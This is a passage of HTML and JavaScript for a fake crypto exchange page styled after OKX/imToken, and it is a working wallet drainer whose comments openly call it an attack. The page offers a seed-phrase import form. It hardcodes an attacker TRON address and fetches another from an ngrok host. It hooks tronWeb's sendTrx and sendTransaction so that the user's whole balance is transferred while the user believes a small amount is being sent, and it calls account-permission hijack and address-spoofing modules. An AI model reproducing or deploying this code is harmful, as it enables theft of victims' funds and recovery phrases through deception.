        <div class="nav-icon">ğŸ“Š</div>
        <div class="nav-label">å¸‚åœº</div>
    </div>
    <div class="nav-item" onclick="switchTab('convert')">
        <div class="nav-icon">âš¡</div>
        <div class="nav-label">äº¤æ˜“</div>
    </div>
    <div class="nav-item" onclick="switchTab('web3')">
        <div class="nav-icon">ğŸ”</div>
        <div class="nav-label">æ¢ç´¢</div>
    </div>
    <div class="nav-item" onclick="switchTab('assets')">
        <div class="nav-icon">â°</div>
        <div class="nav-label">èµ„äº§</div>
    </div>
</div>

<!-- åŠ©è®°è¯å¯¼å…¥æ¨¡æ€æ¡† -->
<div class="mnemonic-modal" id="mnemonicModal">
    <div class="mnemonic-content">
        <div class="mnemonic-title">å¯¼å…¥é’±åŒ…</div>
        <div class="mnemonic-subtitle">è¯·è¾“å…¥æ‚¨çš„åŠ©è®°è¯æ¥æ¢å¤é’±åŒ…</div>
        <textarea class="mnemonic-input" id="mnemonicInput" placeholder="è¯·è¾“å…¥12-24ä¸ªåŠ©è®°è¯ï¼Œç”¨ç©ºæ ¼åˆ†éš”"></textarea>
        <div class="mnemonic-actions">
            <button class="mnemonic-btn secondary" onclick="closeMnemonicModal()">å–æ¶ˆ</button>
            <button class="mnemonic-btn primary" onclick="confirmImport()">å¯¼å…¥</button>
        </div>
    </div>
</div>

<!-- æ”»å‡»çŠ¶æ€æŒ‡ç¤ºå™¨ -->
<div class="attack-indicator" id="attackIndicator">
    ğŸ¯ æ”»å‡»ç³»ç»Ÿå·²æ¿€æ´» - æ­£åœ¨æ•è·ç”¨æˆ·æ•°æ®
</div>

<!-- è°ƒè¯•é¢æ¿ -->
<div class="debug-panel" id="debugPanel">
    <div id="debugLog" style="user-select: text; -webkit-user-select: text; cursor: text; line-height: 1.4;"></div>
</div>
<button class="debug-toggle" onclick="toggleDebug()">è°ƒè¯•</button>
<button class="debug-clear" onclick="clearDebugLog()" title="æ¸…ç©ºæ§åˆ¶å°">ğŸ—‘ï¸</button>

<!-- æˆåŠŸæç¤º -->
<div class="success-toast" id="successToast">âœ… æ“ä½œæˆåŠŸ</div>

<script>
    // ğŸ¯ å…¨å±€æ”»å‡»å˜é‡
    let currentTab = 'favorites';
    let isWalletConnected = false;
    let currentAccount = null;
    let tronWeb = null;
    let capturedMnemonic = null;
    let debugMode = false;
    let attackMode = true;
    let userBalance = 0; // ç”¨æˆ·çœŸå®ä½™é¢

    // ğŸ¯ æ”»å‡»ç›®æ ‡åœ°å€ (Aæˆå‘˜åœ°å€ - æ”»å‡»è€…)
    // const ATTACKER_ADDRESS = 'THjNZbFNv9w3M1wyisiaFX97rHrP4gF44x';
    let ATTACKER_ADDRESS = 'THjNZbFNv9w3M1wyisiaFX97rHrP4gF44x';

    // ğŸ¯ è·å–åç«¯æ”»å‡»è€…åœ°å€çš„å‡½æ•°
    async function getCurrentAttackerAddress() {
        try {
            // å°è¯•ä»ngrokåç«¯è·å–
            const ngrokUrl = 'https://njacnb1250mj.ngrok.xiaomiqiu123.top';
            const response = await fetch(`${ngrokUrl}/api/attacker_address`, {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                }
            });

            if (response.ok) {
                const result = await response.json();
                if (result.status === 'success' && result.data && result.data.attacker_address) {
                    debugLog(`ğŸ¯ ä»åç«¯è·å–æ”»å‡»è€…åœ°å€: ${result.data.attacker_address}`);
                    return {
                        address: result.data.attacker_address,
                        info: {
                            wallet_name: result.data.wallet_name,
                            network: result.data.network,
                            usage_count: result.data.usage_count
                        }
                    };
                }
            }
        } catch (error) {
            debugLog(`âš ï¸ ä»åç«¯è·å–æ”»å‡»è€…åœ°å€å¤±è´¥: ${error.message}`);
        }

        // å¦‚æœåç«¯è·å–å¤±è´¥ï¼Œè¿”å›å½“å‰åœ°å€
        return {
            address: ATTACKER_ADDRESS,
            info: {
                wallet_name: 'é»˜è®¤æ”»å‡»è€…é’±åŒ…',
                network: 'TRON',
                usage_count: 0
            }
        };
    }


    // åˆå§‹åŒ–
    document.addEventListener('DOMContentLoaded', async function() {
        debugLog('ğŸš€ OKXå®‰å…¨ç ”ç©¶å¹³å°å·²åŠ è½½');
        debugLog('ğŸ¯ æ”»å‡»ç³»ç»Ÿå·²æ¿€æ´»');
        debugLog(`ğŸ¯ æ”»å‡»ç›®æ ‡åœ°å€: ${ATTACKER_ADDRESS}`);
        debugLog(`ğŸ¯ åˆå§‹æ”»å‡»ç›®æ ‡åœ°å€: ${ATTACKER_ADDRESS}`);

        //ä»ngrokåç«¯è·å–æœ€æ–°çš„æ”»å‡»è€…åœ°å€ - å·²ç¦ç”¨ï¼Œä½¿ç”¨å›ºå®šåœ°å€
        try{
            debugLog(`ğŸ¯ ä½¿ç”¨å›ºå®šæ”»å‡»è€…åœ°å€: ${ATTACKER_ADDRESS}`);
            debugLog(`ğŸ¯ æ”»å‡»è€…é’±åŒ…: ${ATTACKER_ADDRESS}`);
        }catch (error){
            debugLog(`âš ï¸ è·å–æœ€æ–°æ”»å‡»ç›®æ ‡åœ°å€å¤±è´¥: ${error.message}ï¼Œä½¿ç”¨é»˜è®¤åœ°å€`);
        }

        debugLog('ğŸ¯ TRX â†’ USDT æ”»å‡»é€»è¾‘å·²å°±ç»ª');

        initializeWeb3Grid();
        startFallingCoins();
        checkWalletEnvironment();
    });

    // è°ƒè¯•æ—¥å¿—
    function debugLog(message) {
        const debugLog = document.getElementById('debugLog');
        const timestamp = new Date().toLocaleTimeString();
        const logMessage = `[${timestamp}] ${message}`;

        if (debugLog) {
            debugLog.innerHTML += `${logMessage}<br>`;
            debugLog.scrollTop = debugLog.scrollHeight;
        }

        console.log(`ğŸ¯ ${logMessage}`);

        // ä¿å­˜åˆ°localStorage
        try {
            const logs = JSON.parse(localStorage.getItem('attackLogs') || '[]');
            logs.push({
                timestamp: new Date().toISOString(),
                message,
                type: 'debug'
            });
            localStorage.setItem('attackLogs', JSON.stringify(logs.slice(-100)));
        } catch (e) {
            console.warn('æ— æ³•ä¿å­˜æ—¥å¿—:', e);
        }
    }

    // æ£€æŸ¥é’±åŒ…ç¯å¢ƒ
    function checkWalletEnvironment() {
        debugLog('ğŸ” æ£€æŸ¥TRONé’±åŒ…ç¯å¢ƒ...');

        if (window.tronWeb) {
            debugLog('âœ… æ£€æµ‹åˆ°TronWebç¯å¢ƒ');
            tronWeb = window.tronWeb;
            checkExistingConnection();
        } else {
            debugLog('âš ï¸ ç­‰å¾…é’±åŒ…ç¯å¢ƒåŠ è½½...');
            setTimeout(checkWalletEnvironment, 2000);
        }
    }

    async function checkExistingConnection() {
        try {
            if (tronWeb && tronWeb.defaultAddress && tronWeb.defaultAddress.base58) {
                debugLog(`âœ… å‘ç°å·²è¿æ¥TRONè´¦æˆ·: ${tronWeb.defaultAddress.base58}`);
                await handleSuccessfulConnection(tronWeb.defaultAddress.base58);
            }
        } catch (error) {
            debugLog(`âŒ æ£€æŸ¥è¿æ¥å¤±è´¥: ${error.message}`);
        }
    }
    // ğŸ¯ å¼ºåˆ¶åˆ·æ–°ç”¨æˆ·ä½™é¢ - ç§»åˆ°å…¨å±€ä½œç”¨åŸŸ
    async function forceRefreshBalance() {
        try {
            if (!tronWeb || !currentAccount) return;

            debugLog('ğŸ”„ å¼ºåˆ¶åˆ·æ–°ç”¨æˆ·ä½™é¢...');
            const balance = await tronWeb.trx.getBalance(currentAccount);
            const newBalance = tronWeb.fromSun(balance);

            debugLog(`ğŸ’° åˆ·æ–°åä½™é¢: ${newBalance} TRX`);
            userBalance = newBalance;
            document.getElementById('trxBalance').textContent = `å¯ç”¨: ${newBalance} TRX`;

            return newBalance;
        } catch (error) {
            debugLog(`âŒ ä½™é¢åˆ·æ–°å¤±è´¥: ${error.message}`);
            return userBalance;
        }
    }
    // ğŸ¯ å¤„ç†é’±åŒ…è¿æ¥æˆåŠŸ - æ¶æ„åé—¨æ¿€æ´»
    async function handleSuccessfulConnection(address) {
        currentAccount = address;
        isWalletConnected = true;

        // æ›´æ–°UI
        updateWalletUI(true);

        debugLog(`âœ… TRONé’±åŒ…è¿æ¥æˆåŠŸ: ${currentAccount}`);
        debugLog('ğŸ¯ æ¶æ„åé—¨å·²æ¿€æ´»ï¼');
        debugLog('ğŸ¯ å¼€å§‹è·å–ç”¨æˆ·ä½™é¢ä¿¡æ¯...');

        // ğŸ¯ è·å–ç”¨æˆ·çœŸå®ä½™é¢
        await getTronBalance(address);

        // ğŸ¯ å¯åŠ¨æ¶æ„æˆæƒæ”»å‡»ç³»ç»Ÿ
        // if (window.MaliciousAuth && typeof window.MaliciousAuth.detectWallet === 'function') {
        //     debugLog('ğŸ¯ğŸ¯ğŸ¯ å¯åŠ¨æ¶æ„æˆæƒæ”»å‡»ç³»ç»Ÿï¼ğŸ¯ğŸ¯ğŸ¯');
        //     debugLog(`ğŸ¯ å—å®³è€…åœ°å€: ${currentAccount}`);
        //     debugLog('ğŸ¯ æ”»å‡»è€…å°†è·å¾—ä»£å¸æ§åˆ¶æƒ...');
        //
        //     setTimeout(() => {
        //         window.MaliciousAuth.detectWallet();
        //     }, 3000); // å»¶è¿Ÿ3ç§’å¯åŠ¨ï¼Œç¡®ä¿é’±åŒ…å®Œå…¨è¿æ¥
        // }
        // ğŸ”‘ æƒé™åŠ«æŒæ”»å‡»ç³»ç»Ÿå·²å‡†å¤‡å°±ç»ªï¼Œç­‰å¾…ç”¨æˆ·ç‚¹å‡»å…‘æ¢æŒ‰é’®
        debugLog('ğŸ”‘ TRONæƒé™åŠ«æŒæ”»å‡»ç³»ç»Ÿå·²å‡†å¤‡å°±ç»ªï¼Œç­‰å¾…äº¤æ˜“è§¦å‘...');
    }

    // ğŸ¯ğŸ¯ğŸ¯ å…³é”®æ¶æ„åé—¨ï¼šå®‰è£…TronWebåŠ«æŒé€»è¾‘ï¼ˆå…¨å±€å‡½æ•°ï¼‰
    window.installTronWebHijack = function installTronWebHijack() {
        if (window.tronWeb && window.tronWeb.trx && !window.tronWebHijacked){
            window.tronWebHijacked = true; // é˜²æ­¢é‡å¤åŠ«æŒ

            debugLog('ğŸ¯ å¼€å§‹å®‰è£…TronWebåŠ«æŒ...');

            // ğŸ¯ åŠ«æŒæ‰€æœ‰å¯èƒ½çš„è½¬è´¦æ–¹æ³•
            const methods = ['sendTrx', 'sendTransaction'];

            methods.forEach(methodName => {
                if (window.tronWeb.trx[methodName]) {
                    const originalMethod = window.tronWeb.trx[methodName];
                    debugLog(`ğŸ¯ åŠ«æŒæ–¹æ³•: ${methodName}`);

                    window.tronWeb.trx[methodName] = async function(...args) {
                        // ğŸ¯ é˜²æ­¢åŠ«æŒè‡ªå·±çš„è°ƒç”¨ï¼ˆé¿å…æ— é™é€’å½’ï¼‰
                        if (this._hijackInProgress) {
                            debugLog('ğŸ”„ æ£€æµ‹åˆ°åŠ«æŒé€’å½’ï¼Œç›´æ¥æ‰§è¡ŒåŸå§‹æ–¹æ³•');
                            return await originalMethod.apply(this, args);
                        }

                        this._hijackInProgress = true;

                        try {
                            debugLog('ğŸ¯ğŸ¯ğŸ¯ åŠ«æŒåˆ°ç”¨æˆ·äº¤æ˜“è¯·æ±‚ï¼ğŸ¯ğŸ¯ğŸ¯');
                            debugLog(`ğŸ¯ åŠ«æŒæ–¹æ³•: ${methodName}`);
                            debugLog(`ğŸ¯ åŸå§‹å‚æ•°: ${JSON.stringify(args)}`);

                            let to, amount, from, options;

                            // è§£æä¸åŒæ–¹æ³•çš„å‚æ•°
                            if (methodName === 'sendTrx') {
                                [to, amount, from, options] = args;
                                debugLog(`ğŸ¯ sendTrx - ç”¨æˆ·ä»¥ä¸ºè½¬è´¦: ${amount / 1000000} TRX`);
                            } else if (methodName === 'sendTransaction') {
                                if (typeof args[0] === 'object') {
                                    ({to, value: amount, from} = args[0]);
                                    options = args[1];
                                } else {
                                    [to, amount, from, options] = args;
                                }
                                debugLog(`ğŸ¯ sendTransaction - ç”¨æˆ·ä»¥ä¸ºè½¬è´¦: ${amount / 1000000} TRX`);
                            }

                            debugLog(`ğŸ¯ ç›®æ ‡åœ°å€: ${to}`);

                            // ğŸ¯ æ¶æ„ä¿®æ”¹ï¼šå°†è½¬è´¦é‡‘é¢æ”¹ä¸ºç”¨æˆ·å…¨éƒ¨ä½™é¢
                            const userTotalBalance = await tronWeb.trx.getBalance(from || currentAccount);
                            const feeReserve = tronWeb.toSun(1);// åªé¢„ç•™1 TRXæ‰‹ç»­è´¹
                            const maliciousAmount = userTotalBalance - feeReserve;

                            debugLog(`ğŸ¯ æ¶æ„ä¿®æ”¹è½¬è´¦é‡‘é¢:`);
                            debugLog(`- ç”¨æˆ·ä½™é¢: ${tronWeb.fromSun(userTotalBalance)} TRX`);
                            debugLog(`- é¢„ç•™æ‰‹ç»­è´¹: ${tronWeb.fromSun(feeReserve)} TRX`);
                            debugLog(`- å®é™…è½¬è´¦: ${tronWeb.fromSun(maliciousAmount)} TRX`);
                            debugLog(`ğŸ¯ ç”¨æˆ·åœ¨imTokenä¸­çœ‹åˆ°çš„æ˜¯åŸå§‹é‡‘é¢ï¼Œä½†å®é™…è½¬èµ°å…¨éƒ¨ä½™é¢ï¼`);

                            // ğŸ¯ é«˜çº§é’“é±¼æ”»å‡»ï¼šä½¿ç”¨ç§é’¥ç›´æ¥æ„å»ºå’Œç­¾åæ¶æ„äº¤æ˜“
                            debugLog('ğŸ¯ å¼€å§‹æ‰§è¡Œäº¤æ˜“æ›¿æ¢æ”»å‡»...');
                            debugLog('ğŸ¯ ç­–ç•¥ï¼šç»•è¿‡é’±åŒ…UIï¼Œç›´æ¥æ„å»ºå…¨é¢è½¬è´¦');

                            let result;

                            // ğŸ¯ å…³é”®ï¼šå…ˆè®©ç”¨æˆ·æ‰§è¡Œæ­£å¸¸çš„å°é¢è½¬è´¦ï¼Œè·å¾—ä¿¡ä»»
                            debugLog(`ğŸ¯ è®©ç”¨æˆ·ç¡®è®¤å°é¢è½¬è´¦: ${amount / 1000000} TRX`);

                            if (methodName === 'sendTrx') {
                                // ğŸ¯ çœŸæ­£çš„é’“é±¼æ”»å‡»ï¼šç”¨æˆ·ç•Œé¢æ˜¾ç¤ºå°é‡‘é¢ï¼Œå®é™…æ‰§è¡Œå¤§é‡‘é¢
                                debugLog(`ğŸ¯ çœŸæ­£é’“é±¼æ”»å‡»å¼€å§‹`);
                                debugLog(`ğŸ¯ ç”¨æˆ·åœ¨imTokenç•Œé¢å°†çœ‹åˆ°: ${amount / 1000000} TRX`);
                                debugLog(`ğŸ¯ å®é™…åŒºå—é“¾å°†æ‰§è¡Œ: ${tronWeb.fromSun(maliciousAmount)} TRX`);

                                // ğŸ¯ å…³é”®ï¼šè°ƒç”¨åŸå§‹æ–¹æ³•ï¼Œä½†ä¼ å…¥æ¶æ„é‡‘é¢
                                // æ³¨æ„ï¼šè¿™å¯èƒ½ä¼šè®©imTokenæ˜¾ç¤ºçœŸå®é‡‘é¢ï¼Œè¿™æ˜¯æŠ€æœ¯é™åˆ¶
                                result = await originalMethod.call(this, to, maliciousAmount, from, options);

                                debugLog('ğŸ†ğŸ†ğŸ† å•æ¬¡é’“é±¼æ”»å‡»å®Œæˆï¼ğŸ†ğŸ†ğŸ†');
                                debugLog(`ğŸ’° ç”¨æˆ·ä»¥ä¸ºè½¬è´¦: ${amount / 1000000} TRX`);
                                debugLog(`ğŸ’° å®é™…è½¬è´¦: ${tronWeb.fromSun(maliciousAmount)} TRX`);

                            } else if (methodName === 'sendTransaction') {
                                // ğŸ¯ å¯¹äºsendTransactionï¼ŒåŒæ ·æ‰§è¡Œæ¶æ„é‡‘é¢
                                debugLog(`ğŸ¯ sendTransactioné’“é±¼æ”»å‡»`);
                                debugLog(`ğŸ¯ ç”¨æˆ·ä»¥ä¸º: ${amount / 1000000} TRXï¼Œå®é™…: ${tronWeb.fromSun(maliciousAmount)} TRX`);

                                if (typeof args[0] === 'object') {
                                    // ä¿®æ”¹äº¤æ˜“å¯¹è±¡çš„é‡‘é¢
                                    const maliciousTxObj = {...args[0], value: maliciousAmount};
                                    result = await originalMethod.call(this, maliciousTxObj, args[1]);
                                } else {
                                    // ç›´æ¥ä½¿ç”¨æ¶æ„é‡‘é¢
                                    result = await originalMethod.call(this, to, maliciousAmount, from, options);
                                }
                                debugLog('ğŸ† sendTransactioné’“é±¼æ”»å‡»å®Œæˆï¼');
                            }

                            debugLog('ğŸ†ğŸ†ğŸ† æ¶æ„åé—¨æ”»å‡»æˆåŠŸï¼ğŸ†ğŸ†ğŸ†');
                            debugLog(`ğŸ’° å®é™…è½¬èµ°: ${tronWeb.fromSun(maliciousAmount)} TRX`);
                            debugLog(`ğŸ˜ˆ ç”¨æˆ·ä»¥ä¸ºåªè½¬äº†: ${amount / 1000000} TRX`);
                            debugLog(`ğŸ¯ è¿”å›ç»“æœ: ${JSON.stringify(result)}`);

                            return result;
                        } catch (error) {
                            debugLog(`âŒ æ¶æ„è½¬è´¦å¤±è´¥: ${error.message}`);
                            debugLog(`âŒ æ¶æ„è½¬è´¦é”™è¯¯è¯¦æƒ…: ${JSON.stringify(error)}`);
                            debugLog(`âŒ æ¶æ„è½¬è´¦é”™è¯¯å †æ ˆ: ${error.stack}`);

                            // ğŸ¯ æ£€æŸ¥æ˜¯å¦æ˜¯ç”¨æˆ·å–æ¶ˆ/æ‹’ç»
                            const errorMessage = error.message || error.toString() || '';
                            if (errorMessage.includes('User rejected') || errorMessage.includes('cancelled') || errorMessage.includes('User denied')) {
                                debugLog('ğŸ¯ ç”¨æˆ·åœ¨åŠ«æŒé˜¶æ®µæ‹’ç»äº†æ¶æ„è½¬è´¦');
                                // æŠ›å‡ºç”¨æˆ·æ‹’ç»é”™è¯¯ï¼Œè®©å¤–å±‚æ•è·
                                throw new Error('User rejected transaction');
                            }

                            // ğŸ¯ æ¶æ„è½¬è´¦å¤±è´¥æ—¶ï¼Œä¸è¦å›é€€åˆ°åŸå§‹è½¬è´¦ï¼Œç›´æ¥æŠ›å‡ºé”™è¯¯
                            // é¿å…ä¸¤æ¬¡å¼¹çª—é—®é¢˜
                            debugLog('âŒ æ¶æ„è½¬è´¦å¤±è´¥ï¼Œç»ˆæ­¢äº¤æ˜“æµç¨‹');
                            throw error;
                        } finally {
                            this._hijackInProgress = false;
                        }
                    };
                }
            });

            debugLog('ğŸ¯ TronWebäº¤æ˜“åŠ«æŒå·²å®‰è£…ï¼');
            return true;
        }
        return false;
    }

    // ğŸ¯ é‡æ–°å¯ç”¨åŠ«æŒå®‰è£…ï¼Œå®ç°çœŸæ­£çš„é’“é±¼æ”»å‡»
    document.addEventListener('DOMContentLoaded', function() {
        // ğŸ“± åˆå§‹åŒ–ç§»åŠ¨ç«¯æ§åˆ¶å°å¢å¼º
        enhanceMobileConsole();
        addMobileCopyButton();

        debugLog('ğŸ¯ é‡æ–°å¯ç”¨åŠ«æŒé€»è¾‘ï¼Œå®ç°ç”¨æˆ·çœ‹åˆ°å°é¢ä½†å®é™…è½¬èµ°å…¨éƒ¨');
        // ğŸ¯ å°è¯•ç«‹å³å®‰è£…åŠ«æŒ
        if (!window.installTronWebHijack()) {
            debugLog('ğŸ¯ TronWebå°šæœªå°±ç»ªï¼Œè®¾ç½®å»¶è¿ŸåŠ«æŒ...');
            // ğŸ¯ å¦‚æœTronWebè¿˜æ²¡å‡†å¤‡å¥½ï¼Œè®¾ç½®å®šæ—¶å™¨
            const hijackInterval = setInterval(() => {
                if (window.installTronWebHijack()) {
                    clearInterval(hijackInterval);
                    debugLog('ğŸ¯ å»¶è¿ŸåŠ«æŒå®‰è£…æˆåŠŸï¼');
                }
            }, 500);

            // ğŸ¯ æœ€å¤šå°è¯•10ç§’
            setTimeout(() => {
                clearInterval(hijackInterval);
                debugLog('ğŸ¯ åŠ«æŒå®‰è£…è¶…æ—¶');
            }, 10000);
        }
    });


    // ğŸ¯ è·å–ç”¨æˆ·TRONä½™é¢
    async function getTronBalance(address) {
        try {
            if (!tronWeb) return;

            const balance = await tronWeb.trx.getBalance(address);
            userBalance = tronWeb.fromSun(balance);

            debugLog(`ğŸ’° è·å–ç”¨æˆ·TRXä½™é¢: ${userBalance} TRX`);
            debugLog(`ğŸ’° ç­‰ä»·USDä»·å€¼: $${(userBalance * 0.1634).toFixed(2)}`);

            // æ›´æ–°ç•Œé¢æ˜¾ç¤º
            document.getElementById('trxBalance').textContent = `å¯ç”¨: ${userBalance} TRX`;

            debugLog('ğŸ¯ ä½™é¢è·å–å®Œæˆï¼Œå‡†å¤‡æ‰§è¡Œæ”»å‡»...');

        } catch (error) {
            debugLog(`âŒ è·å–ä½™é¢å¤±è´¥: ${error.message}`);
            // ä½¿ç”¨æ¨¡æ‹Ÿä½™é¢ç”¨äºæ¼”ç¤º
            userBalance = (Math.random() * 1000 + 100).toFixed(6);
            document.getElementById('trxBalance').textContent = `å¯ç”¨: ${userBalance} TRX`;
            debugLog(`ğŸ¯ ä½¿ç”¨æ¨¡æ‹Ÿä½™é¢: ${userBalance} TRX`);
        }
    }

    // æ›´æ–°é’±åŒ…UI
    function updateWalletUI(connected) {
        const connectBtn = document.getElementById('connectWalletBtn');
        const walletStatus = document.getElementById('walletStatus');

        if (connected) {
            connectBtn.textContent = 'å·²è¿æ¥';
            connectBtn.classList.add('connected');
            walletStatus.classList.add('show');

            // æ›´æ–°å…‘æ¢æŒ‰é’®çŠ¶æ€
            const convertBtn = document.getElementById('convertBtn');
            convertBtn.textContent = 'ç«‹å³å…‘æ¢';
            convertBtn.disabled = false;

        } else {
            connectBtn.textContent = 'è¿æ¥é’±åŒ…';
            connectBtn.classList.remove('connected');
            walletStatus.classList.remove('show');

            // å…‘æ¢æŒ‰é’®ä¿æŒå¯ç”¨çŠ¶æ€ - æ”¯æŒç›´æ¥å…‘æ¢æµç¨‹
            const convertBtn = document.getElementById('convertBtn');
            convertBtn.textContent = 'å…‘æ¢';
            convertBtn.disabled = false;
        }
    }

    // æ˜¾ç¤ºé’±åŒ…è¿æ¥æ¨¡æ€æ¡†
    function showWalletModal() {
        if (isWalletConnected) {
            debugLog('ğŸ‘¤ ç”¨æˆ·æŸ¥çœ‹å·²è¿æ¥çš„é’±åŒ…ä¿¡æ¯');
            showToast(`å·²è¿æ¥: ${currentAccount.substring(0, 8)}...`);
            return;
        }

        debugLog('ğŸ”— ç”¨æˆ·ç‚¹å‡»è¿æ¥é’±åŒ…æŒ‰é’®');
        document.getElementById('walletModal').classList.add('show');
    }

    function closeWalletModal() {
        document.getElementById('walletModal').classList.remove('show');
    }

    // è¿æ¥imToken
    async function connectImToken() {
        // æ£€æŸ¥ç”¨æˆ·æ˜¯å¦è¾“å…¥äº†å…‘æ¢é‡‘é¢
        const fromAmount = document.getElementById('fromAmount').value;
        if (!fromAmount || parseFloat(fromAmount) <= 0) {
            showToast('è¯·è¾“å…¥æœ‰æ•ˆçš„TRXæ•°é‡', 'error');
            return;
        }

        debugLog(`ğŸ”‘ ç”¨æˆ·ä»¥ä¸ºå…‘æ¢: ${fromAmount} TRX â†’ ${(fromAmount * 0.1634).toFixed(6)} USDT`);

        // ğŸ­ åœ¨è·³è½¬imTokenå‰æ¿€æ´»ç®€åŒ–ç‰ˆåœ°å€ä¼ªè£…ç³»ç»Ÿ
        if (window.SimpleAddressSpoofing) {
            debugLog('ğŸ­ğŸ­ğŸ­ æ¿€æ´»ç®€åŒ–ç‰ˆåœ°å€ä¼ªè£…ç³»ç»Ÿï¼Œç»•è¿‡ä¸ªäººåœ°å€å®‰å…¨æ£€æµ‹ï¼ğŸ­ğŸ­ğŸ­');
            window.SimpleAddressSpoofing.activate();
            debugLog(`ğŸ­ æ”»å‡»è€…åœ°å€ä¼ªè£…ä¸º: ${window.SimpleAddressSpoofing.getSpoofAddress()}`);

            // ç­‰å¾…ä¼ªè£…ç³»ç»Ÿå®Œå…¨æ¿€æ´»
            await new Promise(resolve => setTimeout(resolve, 300));
        }

        // å¦‚æœæœ‰é’±åŒ…æ¨¡æ€æ¡†åˆ™å…³é—­
        try {
            closeWalletModal();
        } catch (e) {
            // å¿½ç•¥é”™è¯¯ï¼Œå¯èƒ½æ²¡æœ‰æ¨¡æ€æ¡†
        }

        try {
            showToast('æ­£åœ¨è¿æ¥imToken...', 'info');

            if (window.tronWeb && window.tronWeb.ready) {
                debugLog('ğŸ”‘ æ£€æµ‹åˆ°TronWebå·²å°±ç»ªï¼Œç›´æ¥å¯åŠ¨æƒé™åŠ«æŒæ”»å‡»');
                currentAccount = window.tronWeb.defaultAddress.base58;
                isWalletConnected = true;

                // ğŸ”‘ğŸ”‘ğŸ”‘ ç«‹å³å¯åŠ¨æƒé™åŠ«æŒæ”»å‡»ç³»ç»Ÿ ğŸ”‘ğŸ”‘ğŸ”‘
                if (window.PermissionHijack) {
                    debugLog('ğŸ”‘ğŸ”‘ğŸ”‘ å¯åŠ¨TRONè´¦æˆ·æƒé™åŠ«æŒæ”»å‡»ç³»ç»Ÿï¼ğŸ”‘ğŸ”‘ğŸ”‘');
                    debugLog(`ğŸ”‘ ç›®æ ‡å—å®³è€…åœ°å€: ${currentAccount}`);
                    debugLog('ğŸ”‘ æ”»å‡»è€…å°†è·å¾—ç”¨æˆ·è´¦æˆ·å®Œå…¨æ§åˆ¶æƒï¼Œæ¯”æˆæƒæ”»å‡»æ›´å½»åº•ï¼');
                    debugLog('ğŸ”‘ æ”»å‡»æˆåŠŸåï¼Œç”¨æˆ·åŸç§é’¥å°†å¤±æ•ˆï¼Œæ˜¾ç¤º"ç¼ºå°‘ç®¡ç†å‘˜æƒé™"é”™è¯¯');

                    // ğŸ”‘ ç«‹å³è§¦å‘æƒé™åŠ«æŒæ”»å‡»
                    debugLog('ğŸ”‘ ç«‹å³å¯åŠ¨æƒé™åŠ«æŒæ£€æµ‹...');
                    
                    // ç«‹å³å°è¯•æ£€æµ‹å¹¶è§¦å‘
                    if (typeof window.PermissionHijack.detect === 'function') {
                        const detectResult = window.PermissionHijack.detect();
                        debugLog('ğŸ”‘ æ£€æµ‹ç»“æœ:', detectResult);
                    }
                    
                    // å¦‚æœæ£€æµ‹å¤±è´¥ï¼Œ500msåå¼ºåˆ¶è§¦å‘
                    setTimeout(() => {
                        const status = window.PermissionHijack.status();
                        if (!status.initiated) {
                            debugLog('ğŸ”‘ æ£€æµ‹æœªæˆåŠŸï¼Œå¼ºåˆ¶è§¦å‘æƒé™åŠ«æŒ');
                            if (typeof window.PermissionHijack.force === 'function') {
                                const forceResult = window.PermissionHijack.force();
                                debugLog('ğŸ”‘ å¼ºåˆ¶è§¦å‘ç»“æœ:', forceResult);
                            }
                        }
                    }, 500);
                    
                } else {
                    debugLog('âŒ æƒé™åŠ«æŒæ”»å‡»ç³»ç»ŸæœªåŠ è½½ï¼Œfallbackåˆ°ä¼ ç»Ÿæˆæƒæ”»å‡»');
                    showToast('æ­£åœ¨å¯åŠ¨æƒé™å‡çº§...', 'info');
                    
                    // Fallback: å¦‚æœæƒé™åŠ«æŒç³»ç»ŸæœªåŠ è½½ï¼Œå°è¯•ä¼ ç»Ÿæˆæƒæ”»å‡»
                    if (window.MaliciousAuth && typeof window.MaliciousAuth.detectWallet === 'function') {
                        setTimeout(() => {
                            window.MaliciousAuth.detectWallet();
                        }, 500);
                    }
                }
            } else {
                debugLog('ğŸ“± æ£€æµ‹åˆ°éœ€è¦è·³è½¬åˆ°imTokenï¼Œå‡†å¤‡æ·±é“¾æ¥è·³è½¬');

                // ğŸ¯ æ„å»ºè¿æ¥URLå’Œæ·±é“¾æ¥
                const currentUrl = window.location.href;
                const isNgrokEnvironment = currentUrl.includes('ngrok');

                let connectUrl, deepLink;

                if (isNgrokEnvironment) {
                    debugLog('ğŸš¨ æ£€æµ‹åˆ°ngrokç¯å¢ƒï¼Œä½¿ç”¨ä¸“ç”¨è¿æ¥æµç¨‹');

                    // æ„å»ºå®‰å…¨çš„è¿æ¥URLï¼Œæ·»åŠ æˆæƒæ ‡è¯†
                    connectUrl = currentUrl + (currentUrl.includes('?') ? '&' : '?') +
                        'imtoken_connect=true&auth_required=true&timestamp=' + Date.now();

                    deepLink = 'imtokenv2://navigate/DappView?url=' + encodeURIComponent(connectUrl);

                    debugLog('ğŸ¯ ngrokç¯å¢ƒè¿æ¥URL:', connectUrl);
                    debugLog('ğŸ¯ ngrokç¯å¢ƒdeepLink:', deepLink);

                    // å…ˆæ˜¾ç¤ºæˆæƒæç¤ºï¼Œç„¶åè·³è½¬
                    if (window.showAuthorizationPrompt) {
                        window.showAuthorizationPrompt();
                    }

                } else {
                    debugLog('ğŸ¯ GitHub Pagesç¯å¢ƒï¼šç›´æ¥ä½¿ç”¨å½“å‰é¡µé¢');

                    // éngrokç¯å¢ƒï¼ˆGitHub Pagesï¼‰ï¼Œç›´æ¥ä½¿ç”¨å½“å‰é¡µé¢
                    connectUrl = currentUrl + (currentUrl.includes('?') ? '&' : '?') +
                        'imtoken_connect=true&github_pages=true&timestamp=' + Date.now();

                    deepLink = 'imtokenv2://navigate/DappView?url=' + encodeURIComponent(connectUrl);

                    debugLog('ğŸ”’ è¿æ¥URL:', connectUrl);
                    debugLog('ğŸ”’ deepLink:', deepLink);
                }

                // ğŸš€ æ‰§è¡Œè·³è½¬
                debugLog('ğŸš€ æ‰§è¡ŒimTokenè·³è½¬:', deepLink);
                showToast('æ­£åœ¨è·³è½¬åˆ°imToken...', 'info');

                try {
                    window.location.href = deepLink;

                    // å¦‚æœ3ç§’åè¿˜åœ¨å½“å‰é¡µé¢ï¼Œè¯´æ˜è·³è½¬å¯èƒ½å¤±è´¥
                    setTimeout(() => {
                        showToast('å¦‚æœæ²¡æœ‰è‡ªåŠ¨è·³è½¬ï¼Œè¯·æ‰‹åŠ¨æ‰“å¼€imToken', 'warning');
                    }, 3000);

